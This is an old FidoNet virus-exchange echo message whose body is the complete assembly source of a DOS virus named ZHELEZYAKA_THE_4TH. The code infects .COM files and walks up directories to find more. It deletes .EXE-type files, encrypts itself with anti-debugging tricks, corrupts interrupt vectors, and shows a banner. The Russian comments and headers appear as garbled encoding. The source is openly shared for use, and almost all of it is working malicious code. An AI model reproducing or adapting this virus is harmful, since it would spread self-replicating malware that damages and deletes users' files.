;� PVT.VIRII (2:465/65.4) ������������������������������������������� PVT.VIRII �
; Msg  : 1 of 64
; From : MeteO                               2:5030/136      Tue 09 Nov 93 08:59
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : ViRii
;��������������������������������������������������������������������������������
;.RealName: Max Ivanov
;�������������������������������������������������������������������������������
;* Kicked-up by MeteO (2:5030/136)
;* Area : ABC.PVT.HACK (ABC: ���...)
;* From : Alexei Galich, 123:1000/6.2 (31 Oct 94 13:44)
;* To   : All
;* Subj : ViRii
;�������������������������������������������������������������������������������
;�p������y� ���, All
;
;��� ��py� ����ᠫ, ��p���, ᠬ ��ᠫ !
;H����� �p��������� � 1:00-8:00
;
;PS: Hy �� ���� � ��祬y �� ⠡y���� �� ����, �������.
;
;--------8<-------------------------------------------------------
;
;
;         ZHELEZYAKA_THE_4TH

  IDEAL
  MODEL TINY
  CODESEG
  ORG 100H
  LOCALS
MAIN_BEGIN: JMP VIRUS_START_O
  DB 04H,0,' ZHELEZYAKA_THE_4TH ',0

EXIT_ADDRESS EQU 100H
DOS  EQU 21H
VIRUS_SIGNATURE EQU 04H
NUM_FIRST_BYTES EQU 4
ALREADY_INFECT EQU 3
COUNTER_ADDR EQU 510H
FALSE_BYTE_ADDR EQU 104H
COM_WILDCARD EQU (COM_WILDCARD_O-VIRUS_START_O)
EXE_WILDCARD EQU (EXE_WILDCARD_O-VIRUS_START_O)

WRITE_BUFFER EQU (WRITE_BUFFER_O-VIRUS_START_O)
ORIGIN_DIR EQU (WRITE_BUFFER+NUM_FIRST_BYTES)
NEW_DTA  EQU (ORIGIN_DIR+65)
COPY_BUFFER EQU (NEW_DTA+256)
FALSE_BYTES EQU (COPY_BUFFER+WRITE_BUFFER)

ORIGIN_BEGIN EQU (ORIGIN_BEGIN_O-VIRUS_START_O)
MAIN_PART_LEN EQU (WRITE_BUFFER)
INFECTED_NUMB EQU (INFECTED_NUMB_O-VIRUS_START_O)
XOR_VALUE EQU (XOR_VALUE_O-VIRUS_START_O)
XOR_VAL0 EQU (XOR_VAL0_O-VIRUS_START_O)
XOR_VAL00 EQU (XOR_VAL00_O-VIRUS_START_O)
XOR_VAL1 EQU (XOR_VAL1_O-VIRUS_START_O)
XOR_VAL2 EQU (XOR_VAL2_O-VIRUS_START_O)
XOR_VAL3 EQU (XOR_VAL3_O-VIRUS_START_O)
XOR_VAL4 EQU (XOR_VAL4_O-VIRUS_START_O)
BEGIN_CODING EQU (BEGIN_CODING_O-VIRUS_START_O)
CONT_CODING EQU (CONT_CODING_O-VIRUS_START_O)
MESSAGE  EQU (MESSAGE_O-VIRUS_START_O)
DOT  EQU (DOT_O-VIRUS_START_O)

VIRUS_START_O: CALL DETECT_BEGIN_O
XOR_VAL0_O DB 0
DETECT_BEGIN_O: POP SI
  SUB SI,3 ; SI - �砫� �����
  JMP SHORT @@0
XOR_VAL00_O DB 0
@@0:  LEA DI,[SI+BEGIN_CODING]
  CALL CODE
BEGIN_CODING_O =$

  MOV CX,NUM_FIRST_BYTES ; ��稬
  LEA DI,[SI+ORIGIN_BEGIN] ; 䠩�
  MOV BX,100H   ; �
MOVE_LOOP: MOV AH,[DI]   ; �����
  MOV [BX],AH   ;
  INC DI   ;
  INC BX   ;
  LOOP MOVE_LOOP  ;

  LEA DX,[SI+NEW_DTA] ; �⠢��
  MOV AH,1AH  ; ᢮�
  CALL CHECK  ; DTA

  MOV AH,47H   ;
  PUSH SI   ; ����������
  LEA SI,[SI+ORIGIN_DIR+1] ; ⥪�騩
  CWD    ; ��⠫��
  CALL CHECK   ;
  POP SI   ;

FIND_FIRST: LEA DX,[SI+COM_WILDCARD] ; ���� ��ࢮ��
  XOR CX,CX   ; COM 䠩��
  MOV AH,4EH   ;
FIND_NEXT: INT DOS   ;
  JNC @@L1   ;
  JMP NO_FILES_FOUND  ; �᫨ ���, � ...
@@L1:
  LEA DX,[SI+NEW_DTA+1EH] ; ��஥�
  MOV AX,3D02H  ; ���
  CALL CHECK   ; 䠩�


  MOV BX,AX   ; ���⠥�
  MOV AH,3FH   ; ���� 4
  LEA DX,[SI+ORIGIN_BEGIN] ; ����
  MOV DI,DX   ; ��
  MOV CX,NUM_FIRST_BYTES ; �⮣�
  INT DOS   ; 䠩��
  ADD DI,NUM_FIRST_BYTES-1

  CMP [BYTE PTR DI],VIRUS_SIGNATURE
  JE @@L2
  JMP INFECT_FILE
@@L2:
  MOV AH,3EH  ; ���஥�
  CALL CHECK  ; 䠩�

CONT_SEARCHING: MOV AH,4FH  ; ���
  JMP FIND_NEXT ; ᫥���騩 䠩�

COM_WILDCARD_O DB '*.COM',0
EXE_WILDCARD_O DB '*.E*',0

MESSAGE_O DB 13,10,'ZHELEZYAKA_THE_4TH WITH YOU FOREVER',13,10,'$'
DOT_O  DB '..',0

NO_FILES_FOUND: MOV AH,3BH  ; ���頥���
  LEA DX,[SI+DOT] ; �� ��⠫��
  INT DOS  ; �����
  JC @@L4  ; ����
  JMP FIND_FIRST ; ��������
@@L4:
  XOR AX,AX   ;
  MOV ES,AX   ; �����稢���
  MOV DI,COUNTER_ADDR  ; ���稪
  MOV AX,[ES:DI]  ;

  INC AL   ;
  MOV [ES:DI],AX  ; ��
  CMP AL,ALREADY_INFECT ; �㤥�
  JG INFECT_MORE  ; ������?
  CMP AH,ALREADY_INFECT-2 ;
  JG BANNER   ;
  JMP EXECUTE_PROG  ;

BANNER:  XOR AX,AX ; ���� ���稪�
  MOV [ES:DI],AX

  LEA DX,[SI+MESSAGE]  ; �뢮�
  MOV AH,9   ; ᮮ�饭��
  CALL CHECK   ;

  MOV CX,5 ;
CONTINUE_NOISE: MOV DL,7 ; ���
  MOV AH,2 ;
  INT DOS ;
  LOOP CONTINUE_NOISE
  JMP EXECUTE_PROG

INFECT_MORE: XOR AL,AL  ; ��࠭�� ��ࢮ�� .E* 䠩��
  INC AH
  MOV [ES:DI],AX

  LEA DI,[SI+ORIGIN_DIR] ;
  MOV [BYTE PTR DI],'\' ; ����⠭��������
  MOV AH,3BH   ; ����
  XCHG DX,DI   ; ��⠫��
  INT DOS   ;

  LEA DX,[SI+EXE_WILDCARD]
  XOR CX,CX
  MOV AH,4EH
  INT DOS
  JC EXECUTE_PROG

  LEA DX,[SI+NEW_DTA+1EH]
  MOV AH,41H
  INT 21H

EXECUTE_PROG: MOV DX,80H ; �⠢��
  MOV AH,1AH ; �����
  INT DOS ; DTA

  LEA DI,[SI+ORIGIN_DIR] ;
  MOV [BYTE PTR DI],'\' ; ����⠭��������
  MOV AH,3BH   ; ����
  XCHG DX,DI   ; ��⠫��
  INT DOS   ;

  MOV AX,DS
  MOV ES,AX
  MOV BP,100H   ;
  JMP BP   ;

INFECT_FILE:
  XOR AL,AL    ;
  MOV AH,[BYTE PTR SI+XOR_VALUE] ;
@@IFZERO: INC AH    ;
  JZ @@IFZERO   ; �����⠢������
  MOV [BYTE PTR SI+XOR_VALUE],AH ; ����
  MOV [SI+XOR_VAL0],AH  ; ���
  MOV [SI+XOR_VAL00],AH  ;
  MOV [SI+XOR_VAL1],AH  ;
  MOV [SI+XOR_VAL2],AH  ;
  MOV [SI+XOR_VAL3],AH  ;
  MOV [SI+XOR_VAL4],AH  ;

  MOV AX,5700H ; ����������
  CALL CHECK  ; �६�
  PUSH CX  ; ᮧ�����
  PUSH DX  ;

  XOR CX,CX  ; ����
  XOR DX,DX  ; ��
  MOV AX,4202H ; �����
  CALL CHECK  ; 䠩��

  SUB AX,3    ; �����⠢������
  MOV [BYTE PTR SI+WRITE_BUFFER],0E9H ; ����
  MOV [SI+WRITE_BUFFER+1],AX  ; 4 ����
  MOV [BYTE PTR SI+WRITE_BUFFER+3],VIRUS_SIGNATURE

  MOV CX,MAIN_PART_LEN     ;
  MOV DI,SI       ; �����㥬
COPY_LOOP: MOV AH,[DI]       ; �����
  MOV [DI+COPY_BUFFER],AH     ; �
  INC DI       ; �����
  LOOP COPY_LOOP      ;

  LEA DI,[SI+COPY_BUFFER+BEGIN_CODING]   ; �����㥬
  CALL CODER_DECODER      ; ���

  LEA DI,[SI+COPY_BUFFER+CONT_CODING]
  CALL FIRST_CODE

  MOV CX,MAIN_PART_LEN  ; �����ࠥ�
  MOV AL,[BYTE PTR FALSE_BYTE_ADDR] ; �����
  ADD AL,[FALSE_BYTES]  ;
  XOR AH,AH    ;
  ADD CX,AX    ; ��襬
  LEA DX,[SI+COPY_BUFFER]  ; �������
  MOV AH,40H    ; ����
  INT DOS    ; �����


  XOR CX,CX  ; ����
  XOR DX,DX  ; ��
  MOV AX,4200H ; ��砫�
  CALL CHECK  ; 䠩��

  MOV CX,NUM_FIRST_BYTES ; ��ࠢ�塞
  LEA DX,[SI+WRITE_BUFFER] ; ����
  MOV AH,40H   ; �����
  INT DOS   ; 䠩��

  POP DX  ; ����⠭��������
  POP CX  ; �६�
  MOV AX,5701H ; ᮧ�����
  CALL CHECK  ;

  MOV AH,3EH  ; ����뢠��
  INT DOS  ; 䠩�

  CALL CODE_INT

  JMP EXECUTE_PROG

ORIGIN_BEGIN_O DB 0CDH,20H,90H,90H

CONT_CODING_O =$

CODER_DECODER: MOV CX,CODER_DECODER-BEGIN_CODING_O-1
  MOV AH,[SI+XOR_VALUE]
  XOR AL,AL
  OUT 21H,AL
CODING_LOOP: IN AL,21H
  ADD AL,AH
  XOR [DI],AL   ; ���
  INC DI   ; ����஢騪
  ADD AL,[FALSE_BYTE_ADDR]
  OUT 21H,AL   ;
  LOOP CODING_LOOP  ;
  XOR AL,AL
  OUT 21H,AL
  RET

CHECK:  PUSH AX ; �����஢�� ���뢠���
  PUSHF
  MOV AL,0FEH
  OUT 21H,AL
  MOV AH,4FH
  POPF
  POP AX
  INT 21H
  PUSH AX
  PUSHF
  IN AL,21H
  CMP AL,0FEH
@@HALT:  JNE @@HALT
  XOR AL,AL
  OUT 21H,AL
  POPF
  POP AX
  RET

CODE_INT: XOR AX,AX ; ����஢���� INT 0 - 3
  MOV ES,AX
  MOV CX,12
COD_INT_CON: MOV BX,CX
  XOR [BYTE PTR ES:BX],10101010B
  LOOP COD_INT_CON
  PUSH CS
  POP ES
  RET
       ; ------------
FIRST_CODE: MOV CX,FIRST_CODE-CODER_DECODER ; �।���⥫��
  MOV AH,[SI+XOR_VALUE]  ; ����஢騪
  JMP SHORT FIRST_COD_LOOP
XOR_VAL1_O DB 0
FIRST_COD_LOOP: XOR [DI],AH
  INC DI
  JMP SHORT @@2
XOR_VAL2_O DB 0
@@2:  LOOP FIRST_COD_LOOP
  RET

XOR_VALUE_O DB 0

CODE:  PUSH DI
  LEA DI,[SI+CONT_CODING]
  JMP @@3
XOR_VAL3_O DB 0
@@3:  CALL FIRST_CODE
  MOV AH,40H
  JMP @@4
XOR_VAL4_O DB 0
@@4:  CALL CHECK  ; �⮡� �������� ���墠�稪
  CALL CODE_INT
  POP DI
  JMP SHORT CODER_DECODER

WRITE_BUFFER_O =$
  END MAIN_BEGIN

;---------------8<-------------------------------------------------
;
;- �� �� �뫮 �� �p����쭮, ����� �� �� �뫮 ⠪ ���쭮.
;
;  -= iR0NMAN =-
;
;-+- GoldED 2.50.B1016+
; + Origin: ��H����� - ��� �����H�� !!! (123:1000/6.2)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    � The Me�eO
;
;/p            Check for code segment overrides in protected mode
;
;--- Aidstest Null: /Kill
; * Origin: �PVT.ViRII�main�board� / Virus Research labs. (2:5030/136)

